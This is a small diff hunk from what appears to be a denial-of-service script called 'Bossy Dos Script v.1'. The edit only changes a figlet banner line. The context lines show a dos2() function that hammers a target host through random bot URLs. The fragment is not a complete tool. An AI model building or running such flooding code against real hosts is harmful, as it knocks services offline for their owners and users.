@@ -73,7 +73,7 @@ def dos2():
 		bot_hammering(random.choice(bots)+"http://"+host)
 		w.task_done()
 
-		figlet -ctf slant "BossyV1.0"
+		figlet "BossyV1.0"
 
 def usage():
 	print (''' \033[92m	Bossy Dos Script v.1 https://www.aspartim.org/
